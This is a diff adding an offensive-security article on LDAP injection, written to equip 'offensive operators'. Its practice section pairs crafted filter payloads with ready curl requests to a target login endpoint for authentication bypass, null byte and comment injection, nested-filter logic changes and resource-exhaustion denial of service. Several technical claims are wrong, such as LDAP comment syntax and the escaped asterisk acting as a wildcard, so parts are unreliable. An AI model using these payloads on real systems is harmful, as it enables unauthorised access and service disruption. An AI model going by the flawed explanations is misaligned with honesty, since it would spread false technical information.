@@ -1,0 +1,137 @@
+---
+title: Advanced LDAP Injection Techniques
+description: Explore advanced LDAP injection techniques for bypass, evasion, and impact
+  escalation in web applications.
+keywords:
+- LDAP injection
+- Unicode evasion
+- null byte injection
+- LDAP filter manipulation
+- escape sequence abuse
+---
+
+# Advanced Techniques
+
+## Context
+
+The objective of this article is to empower offensive operators with the knowledge and skills needed to exploit advanced LDAP injection techniques. These methods focus on achieving bypasses, evasion, and impact escalation in web applications that utilize LDAP for authentication and data querying. The reader is expected to have a solid understanding of LDAP protocol fundamentals, LDAP query structure and filter basics, as well as standard LDAP injection methodologies.
+
+## Theory
+
+### Unicode and Encoding Evasion in LDAP Filters
+
+Unicode and encoding evasion techniques involve leveraging alternate character representations to bypass input validation in LDAP filters. By encoding special characters, such as using `\2a` to represent `*`, attackers can evade blacklists and input sanitization mechanisms. This technique allows for the injection of encoded payloads into LDAP queries to manipulate filter logic or even escalate privileges.
+
+### Case Sensitivity and Null Byte Injection
+
+By exploiting case sensitivity, attackers take advantage of LDAP's handling of attribute names or values with varying case. This method also includes injecting null bytes (e.g., `\00`) which can terminate or alter the parsing of an LDAP filter. Such injections exploit implementation flaws where certain LDAP implementations mishandle null bytes, leading to truncated or improperly-processed input.
+
+### Escape Sequence and Comment Injection
+
+Escape sequence abuse manipulates filter parsing by injecting special characters using escape codes, such as `\28`, `\29`, and `\5c`. In parallel, injecting comments (e.g., `/* ... */`) within LDAP queries can neutralize filter segments or bypass controls entirely.
+
+### Nested and Recursive Filter Injection
+
+Nested filter injection entails embedding additional logical operators or filters within the original LDAP query. Attackers craft payloads incorporating nested operators such as `&`, `|`, or `!` to alter the intended logic of the query. Recursive queries can particularly lead to excessive processing demands or unintended data exposure.
+
+### Resource Exhaustion and Denial of Service via Filter Complexity
+
+Filter complexity attacks aim to create deeply nested or computationally expensive filters to exhaust server resources. By injecting filters with extensive nesting or wildcards, attackers can trigger high CPU and memory usage. LDAP servers often lack safeguards against such recursion or complexity, which may lead to denial-of-service conditions.
+
+## Practice
+
+### Unicode and Encoding Evasion
+
+- Inject a wildcard character using encoding in the LDAP filter:
+  
+    ```sql
+    (&(uid=admin)(userPassword=\2a))
+    ```
+
+  Explanation: Injects an encoded wildcard to bypass password checks.
+
+- Use a curl command to send the payload:
+
+    ```bash
+    curl -X POST -d 'username=admin&password=%2a' http://target/login
+    ```
+
+  Outcome: Successfully bypass authentication by evading input filters with encoded characters.
+
+### Null Byte Injection
+
+- Insert a null byte into the LDAP filter:
+
+    ```sql
+    (&(uid=admin\00)(userPassword=secret))
+    ```
+
+  Explanation: Injects a null byte to potentially truncate filter parsing.
+
+- Use the following curl command:
+
+    ```bash
+    curl -X POST -d $'username=admin\\x00&password=secret' http://target/login
+    ```
+
+  Outcome: Alter or bypass authentication logic through null byte injection.
+
+### Escape Sequence and Comment Injection
+
+- Apply escape sequences and comment injection:
+
+    ```sql
+    (&(uid=admin)/*)(userPassword=secret)
+    ```
+
+  Explanation: Uses comment to neutralize the password check segment.
+
+- Use this curl command for the payload:
+
+    ```bash
+    curl -X POST -d 'username=admin)/*&password=secret' http://target/login
+    ```
+
+  Outcome: Bypass authentication by commenting out filter segments.
+
+### Nested Filter Injection
+
+- Construct a nested filter within the LDAP query:
+
+    ```sql
+    (&(uid=admin)(|(userPassword=secret)(userPassword=*)))
+    ```
+
+  Explanation: Injects a nested OR operator to allow authentication with any password.
+
+- Send the payload using curl:
+
+    ```bash
+    curl -X POST -d 'username=admin&password=*)(' http://target/login
+    ```
+
+  Outcome: Successful manipulation of filter logic for authentication with arbitrary credentials.
+
+### Filter Complexity Denial of Service
+
+- Design a payload for resource exhaustion:
+
+    ```sql
+    (&(|(uid=*)(uid=*)(uid=*)(uid=*)(uid=*))(objectClass=*))
+    ```
+
+  Explanation: Creates a deeply nested filter to exhaust server resources.
+
+- Execute the following command:
+
+    ```bash
+    curl -X POST -d 'username=*)(uid=*)(uid=*)(uid=*)(' http://target/login
+    ```
+
+  Outcome: Trigger high resource usage or potential crash of the LDAP server.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **ldapsearch**
